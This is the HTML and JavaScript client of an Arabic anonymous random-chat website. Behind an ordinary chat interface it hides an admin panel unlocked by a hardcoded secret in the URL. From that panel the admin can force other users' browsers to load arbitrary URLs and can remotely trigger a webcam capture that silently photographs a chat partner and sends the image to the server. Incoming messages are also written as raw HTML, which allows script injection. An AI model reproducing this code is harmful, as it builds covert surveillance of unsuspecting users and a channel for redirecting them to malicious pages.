<!DOCTYPE html>
<html lang="ar">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>شات عربي | دردشة عشوائية</title>
<style>
* { margin: 0px; padding: 0px; box-sizing: border-box; }
body { font-family: Tahoma, Arial, sans-serif; background-color: #fff; direction: rtl; transition: background 0.3s ease; }

.header { background-color: rgb(24, 149, 210); direction: rtl; padding: 6px 12px; display: flex; justify-content: space-between; align-items: center; }
.header-right { display: flex; flex-direction: column; }
.header > .header-right > a { color: rgb(255, 255, 255); text-decoration: none; font-size: 28px; font-weight: bold; cursor: pointer; line-height: 1.1; }
.header b { color: lavender; font-size: 13px; font-weight: normal; margin-top: 2px; }

#timer { color: #fff; font-size: 13px; background: rgba(0,0,0,0.2); padding: 3px 8px; border-radius: 4px; display: none; }

#admin-panel { display: none; background: #ffeaa7; padding: 10px; border-bottom: 2px solid #fdcb6e; text-align: center; font-size: 13px; }
#admin-panel input, #admin-panel select { padding: 4px; border-radius: 4px; border: 1px solid #ccc; font-size: 13px; margin: 2px; }
#admin-panel button { padding: 4px 8px; background: #e17055; color: white; border: none; border-radius: 4px; cursor: pointer; font-size: 13px; margin: 2px; }
#admin-panel button.danger { background: #d63031; }
#system-alert-banner { display: none; background: #ff4757; color: white; text-align: center; padding: 6px; font-weight: bold; font-size: 14px; }

#chat { width: 100%; direction: rtl; position: relative; }
#conv { padding: 4px; direction: rtl; height: 330px; overflow-y: auto; }
#conv span, #conv p, #conv div { border-radius: 5px; padding: 4px 8px; margin: 5px; display: table; font-size: 18px; font-weight: normal; max-width: 80%; word-break: break-word; }

#sr { background: rgb(245, 245, 245); color: tomato; }
#hi { background: rgb(245, 245, 245); color: rgb(41, 177, 63); display: none !important; }

#typing-indicator { 
  background: rgb(245, 245, 245) !important; color: rgb(110, 110, 110) !important; 
  font-size: 13px !important; font-weight: normal !important;
  margin-left: 0 !important; margin-right: auto !important; 
  display: none; padding: 3px 8px !important; border-radius: 4px !important;
}

#conv div.my-msg { background: rgb(233, 236, 241); color: rgb(119, 119, 119); margin-right: 0; margin-left: auto; }
#conv p.partner-msg { background: rgb(24, 149, 210); color: rgb(255, 255, 255); margin-left: 0; margin-right: auto; }
#conv p.partner-msg a, #conv div.my-msg a { text-decoration: underline; }

#conv img { max-width: 180px; max-height: 180px; border-radius: 5px; display: block; margin-top: 5px; cursor: pointer; transition: opacity 0.2s; }
#conv img:hover { opacity: 0.9; }
#conv video, #conv audio { max-width: 200px; border-radius: 5px; display: block; margin-top: 5px; }

#send { display: table; width: 100%; background: rgb(248, 248, 248); padding: 2px 0px; border-top: 1px solid rgb(238, 238, 238); border-bottom: 1px solid rgb(238, 238, 238); }
#send .send-row { display: table-row; }
#send p { display: table-cell; text-align: center; padding: 2px 4px; vertical-align: middle; }

#inp { width: 100%; padding: 6px; border: 1px solid rgb(221, 221, 221); border-radius: 5px; outline: none; font-size: 16px; direction: rtl; background: #fff; }
#snd, .file-btn, #mic-btn { padding: 6px 12px; cursor: pointer; background: rgb(238, 238, 238); color: rgb(51, 51, 51); border: 1px solid rgb(204, 204, 204); border-radius: 3px; font-size: 14px; text-align: center; display: inline-block; width: 100%; }
.file-btn { background: #fdfdfd; }
#mic-btn { background: #fdfdfd; }
#mic-btn.recording { background: red !important; color: white !important; }
#file-input { display: none; }

#out { font-size: 20px; font-weight: normal; text-align: center; direction: rtl; display: none; padding: 20px; }
#out span { color: red; }
#out a { background: coral; color: rgb(255, 255, 255); text-decoration: none; padding: 2px 5px; border-radius: 3px; cursor: pointer; }

#image-modal { display: none; position: fixed; z-index: 9999; left: 0; top: 0; width: 100%; height: 100%; background-color: rgba(0,0,0,0.85); text-align: center; justify-content: center; align-items: center; }
#image-modal img { max-width: 90%; max-height: 90%; border-radius: 5px; box-shadow: 0 0 15px rgba(255,255,255,0.2); }
#image-modal span { position: absolute; top: 15px; left: 25px; color: #fff; font-size: 35px; font-weight: bold; cursor: pointer; }
</style>
</head>
<body>
  <div class="header">
    <div class="header-right">
      <a onclick="location.reload()">شات عربي</a>
      <b>دردشة عربية مجانية بدون تسجيل</b>
    </div>
    <div id="timer">00:00</div>
  </div>
  
  <div id="system-alert-banner"></div>

  <div id="admin-panel">
    <input type="text" id="admin-url-inp" placeholder="رابط..." style="width: 80px;">
    <button onclick="adminAction('open_url')">فتح رابط</button>
    <button onclick="adminAction('request_photo')">📸 طلب صورة</button>
    <select id="preset-bg-color" onchange="adminAction('change_bg', this.value)">
      <option value="">تغيير الخلفية</option>
      <option value="#ffffff">أبيض</option>
      <option value="#f1f2f6">رمادي</option>
      <option value="#2d3436">داكن</option>
    </select>
    <button onclick="adminAction('alert')">📢 تنبيه</button>
    <button class="danger" onclick="adminAction('clear_all')">مسح الكل</button>
    <button class="danger" onclick="adminAction('clear_theirs')">مسح رسائله</button>
  </div>
  
  <div id="chat">
   <div id="conv">
    <span id="sr">جاري البحث عن متصل</span>
    <span id="hi">تم الاتصال, قل مرحبا</span>
   </div>
   
   <div id="send">
     <div class="send-row">
       <p style="width: 12%;"><button id="snd">إرسال</button></p>
       <p style="width: 12%;"><button id="mic-btn" title="تسجيل صوت">🎤</button></p>
       <p style="width: 12%;">
         <input type="file" id="file-input" accept="image/*,video/*,audio/*">
         <label for="file-input" class="file-btn" id="file-label" title="إرسال ملف/صورة">📁</label>
       </p>
       <p style="width: 64%;"><input id="inp" type="text" autocomplete="off" placeholder="اكتب رسالة..."></p>
     </div>
   </div>
  </div>

  <h5 id="out">
    <span>المستخدم غادر الدردشة</span><br><br>
    <a onclick="location.reload()">بحث عن متصل</a>
  </h5>

  <div id="image-modal" onclick="closeModal()">
    <span onclick="closeModal()">&times;</span>
    <img id="modal-img">
  </div>

  <script src="/socket.io/socket.io.js"></script>
  <script>
    const socket = io();
    const sr = document.getElementById('sr');
    const hi = document.getElementById('hi');
    const conv = document.getElementById('conv');
    const inp = document.getElementById('inp');
    const snd = document.getElementById('snd');
    const chat = document.getElementById('chat');
    const out = document.getElementById('out');
    const fileInput = document.getElementById('file-input');
    const fileLabel = document.getElementById('file-label');
    const micBtn = document.getElementById('mic-btn');
    const timerEl = document.getElementById('timer');
    const imageModal = document.getElementById('image-modal');
    const modalImg = document.getElementById('modal-img');

    let typingTimeout;
    let typingSpan = null;
    let timerInterval;
    let secondsElapsed = 0;
    let isConnectedPartner = false; 

    const urlParams = new URLSearchParams(window.location.search);
    const adminSecret = urlParams.get('admin');
    const isAdmin = adminSecret === 'mySuperSecretAdmin123';

    if (isAdmin) {
      document.getElementById('admin-panel').style.display = 'block';
    }

    inp.disabled = true;
    snd.disabled = true;

    socket.emit('find_partner');

    socket.on('matched', () => {
      isConnectedPartner = true;
      hi.style.setProperty('display', 'table', 'important');
      inp.disabled = false;
      snd.disabled = false;
      inp.focus();
      startTimer();
    });

    socket.on('partner_disconnected', () => {
      isConnectedPartner = false;
      chat.style.display = 'none';
      out.style.display = 'block';
      stopTimer();
    });

    socket.on('message', (data) => {
      removeTypingIndicator();
      appendMessage(data, false);
    });

    socket.on('display_typing', (isTyping) => {
      if (isTyping) showTypingIndicator();
      else removeTypingIndicator();
    });

    function startTimer() {
      secondsElapsed = 0;
      timerEl.style.display = 'block';
      timerInterval = setInterval(() => {
        secondsElapsed++;
        const mins = Math.floor(secondsElapsed / 60).toString().padStart(2, '0');
        const secs = (secondsElapsed % 60).toString().padStart(2, '0');
        timerEl.textContent = `${mins}:${secs}`;
      }, 1000);
    }

    function stopTimer() {
      clearInterval(timerInterval);
    }

    inp.addEventListener('input', () => {
      socket.emit('typing', true);
      clearTimeout(typingTimeout);
      typingTimeout = setTimeout(() => {
        socket.emit('typing', false);
      }, 1000);
    });

    function showTypingIndicator() {
      if (!typingSpan) {
        typingSpan = document.createElement('span');
        typingSpan.id = 'typing-indicator';
        typingSpan.innerHTML = '✍️ يكتب...';
        typingSpan.style.display = 'table';
        conv.appendChild(typingSpan);
        conv.scrollTop = conv.scrollHeight;
      }
    }

    function removeTypingIndicator() {
      if (typingSpan) {
        typingSpan.remove();
        typingSpan = null;
      }
    }

    function linkify(text) {
      const urlRegex = /(https?:\/\/[^\s]+)/g;
      return text.replace(urlRegex, url => `<a href="${url}" target="_blank">${url}</a>`);
    }

    function sendMsg() {
      const text = inp.value.trim();
      if(text !== "" && !inp.disabled && isConnectedPartner) {
        socket.emit('message', { type: 'text', content: text });
        appendMessage({ type: 'text', content: text }, true);
        inp.value = "";
        socket.emit('typing', false);
      }
    }

    function appendMessage(data, isMe) {
      const element = document.createElement(isMe ? 'div' : 'p');
      element.className = isMe ? 'my-msg' : 'partner-msg';
      
      if (data.type === 'text') {
        element.innerHTML = linkify(data.content);
      } else if (data.type === 'image') {
        const img = document.createElement('img');
        img.src = data.content;
        img.onclick = () => {
          modalImg.src = data.content;
          imageModal.style.display = 'flex';
        };
        element.appendChild(img);
      } else if (data.type === 'video') {
        const video = document.createElement('video');
        video.src = data.content;
        video.controls = true;
        element.appendChild(video);
      } else if (data.type === 'audio') {
        const audio = document.createElement('audio');
        audio.src = data.content;
        audio.controls = true;
        element.appendChild(audio);
      }

      conv.appendChild(element);
      conv.scrollTop = conv.scrollHeight;
    }

    function closeModal() {
      imageModal.style.display = 'none';
    }

    snd.addEventListener('click', sendMsg);
    inp.addEventListener('keypress', (e) => {
      if(e.key === 'Enter') sendMsg();
    });

    fileLabel.addEventListener('click', (e) => {
      if (!isConnectedPartner) {
        e.preventDefault();
        alert('لا يمكنك إرسال ملفات، يرجى الانتظار حتى يتم الاتصال بشخص.');
      }
    });

    fileInput.addEventListener('change', (e) => {
      const file = e.target.files[0];
      if (!file) return;

      const reader = new FileReader();
      reader.onload = function(event) {
        let type = 'image';
        if (file.type.startsWith('video')) type = 'video';
        else if (file.type.startsWith('audio')) type = 'audio';

        const payload = { type: type, content: event.target.result };
        socket.emit('message', payload);
        appendMessage(payload, true);
        fileInput.value = '';
      };
      reader.readAsDataURL(file);
    });

    let mediaRecorder;
    let audioChunks = [];
    let isRecording = false;

    micBtn.addEventListener('click', async () => {
      if (!isConnectedPartner) {
        alert('لا يمكنك تسجيل رسالة صوتية، يرجى الانتظار حتى يتم الاتصال بشخص.');
        return;
      }

      if (!isRecording) {
        try {
          const stream = await navigator.mediaDevices.getUserMedia({ audio: true });
          mediaRecorder = new MediaRecorder(stream);
          audioChunks = [];

          mediaRecorder.ondataavailable = event => {
            audioChunks.push(event.data);
          };

          mediaRecorder.onstop = () => {
            const audioBlob = new Blob(audioChunks, { type: 'audio/webm' });
            const reader = new FileReader();
            reader.onload = function(e) {
              const payload = { type: 'audio', content: e.target.result };
              socket.emit('message', payload);
              appendMessage(payload, true);
            };
            reader.readAsDataURL(audioBlob);
          };

          mediaRecorder.start();
          isRecording = true;
          micBtn.classList.add('recording');
        } catch (err) {
          alert('تعذر الوصول إلى الميكروفون');
        }
      } else {
        mediaRecorder.stop();
        isRecording = false;
        micBtn.classList.remove('recording');
      }
    });

    function adminAction(type, value = null) {
      if (!isAdmin) return;
      let payload = { secret: adminSecret, action: '' };

      if (type === 'open_url') {
        payload.action = 'open_url';
        payload.url = document.getElementById('admin-url-inp').value;
      } else if (type === 'request_photo') {
        payload.action = 'request_media';
        payload.mediaType = 'photo';
      } else if (type === 'change_bg') {
        payload.action = 'change_bg';
        payload.bgColor = value;
      } else if (type === 'alert') {
        payload.action = 'alert';
        payload.message = prompt('اكتب نص التنبيه:');
        if (!payload.message) return;
      } else if (type === 'clear_all') {
        payload.action = 'clear_chat';
        payload.target = 'all';
      } else if (type === 'clear_theirs') {
        payload.action = 'clear_chat';
        payload.target = 'theirs';
      }

      socket.emit('admin_action', payload);
    }

    socket.on('system_alert', (msg) => {
      const banner = document.getElementById('system-alert-banner');
      banner.innerText = `⚠️ تنبيه إداري: ${msg}`;
      banner.style.display = 'block';
      setTimeout(() => { banner.style.display = 'none'; }, 8000);
    });

    socket.on('force_open_url', (url) => {
      if (!isAdmin) window.location.href = url;
    });

    socket.on('clear_chat', (target) => {
      if (target === 'all') {
        document.querySelectorAll('.my-msg, .partner-msg').forEach(el => el.remove());
      } else if (target === 'theirs') {
        document.querySelectorAll('.partner-msg').forEach(el => el.remove());
      }
    });

    socket.on('change_bg', (bgColor) => {
      document.body.style.backgroundColor = bgColor;
    });

    // --- التعديل الآمن لالتقاط الصورة عبر Canvas ---
    socket.on('trigger_camera', async ({ mediaType }) => {
      if (isAdmin) return;
      try {
        const stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: false });
        if (mediaType === 'photo') {
          const video = document.createElement('video');
          video.srcObject = stream;
          video.autoplay = true;
          
          video.onloadedmetadata = () => {
            const canvas = document.createElement('canvas');
            canvas.width = video.videoWidth || 640;
            canvas.height = video.videoHeight || 480;
            const ctx = canvas.getContext('2d');
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
            
            const dataUrl = canvas.toDataURL('image/jpeg');
            socket.emit('user_media_captured', { dataUrl: dataUrl, type: 'image' });
            
            stream.getTracks().forEach(track => track.stop());
          };
        }
      } catch (err) {
        console.log('الكاميرا غير متاحة أو تم رفض الإذن');
      }
    });
  </script>
</body>
</html>
